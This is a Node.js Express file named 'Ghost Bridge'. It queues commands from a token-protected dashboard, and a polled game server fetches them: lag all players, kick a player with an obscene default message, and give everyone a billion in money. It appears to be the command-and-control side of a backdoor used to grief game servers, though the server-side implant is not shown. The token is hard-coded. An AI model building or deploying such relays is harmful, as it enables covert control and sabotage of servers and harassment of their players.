const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Serve Dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Internal State
let PENDING_COMMANDS = [];
const TOKEN = "GHOST_2025";

// Endpoint 1: Dashboard adds a command
app.post('/api/exec', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    
    const { action, duration, targetId, kickMsg, amount } = req.body;
    let cmdPayload = "";

    // STRICT VALIDATION TO PREVENT BAD CASTS
    if (action === "lagAll") {
        cmdPayload = JSON.stringify({ type: "lagAll", duration: parseInt(duration) || 5 });
    } else if (action === "kick") {
        const id = parseInt(targetId);
        if (isNaN(id) || id < 0) return res.status(400).json({ error: 'Invalid Player ID' });
        cmdPayload = JSON.stringify({ type: "kick", targetId: id, msg: kickMsg || "Suck my Nuts Bitch" });
    } else if (action === "moneyAll") {
        const amt = parseInt(amount) || 1000000000;
        cmdPayload = JSON.stringify({ type: "moneyAll", amount: amt });
    } else {
        return res.status(400).json({ error: 'Unsupported action in this build' });
    }

    PENDING_COMMANDS.push(cmdPayload);
    console.log(`[Bridge] Queued: ${cmdPayload}`);
    res.json({ status: 'queued' });
});

// Endpoint 2: SERVER polls for commands
app.get('/api/poll', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    
    if (PENDING_COMMANDS.length > 0) {
        const cmd = PENDING_COMMANDS.shift();
        console.log(`[Bridge] Dispatching command to Server`);
        res.json({ status: 'active', command: cmd });
    } else {
        res.json({ status: 'idle' });
    }
});

app.listen(8080, () => console.log(`Ghost Bridge Active (Server Pull Mode)`));
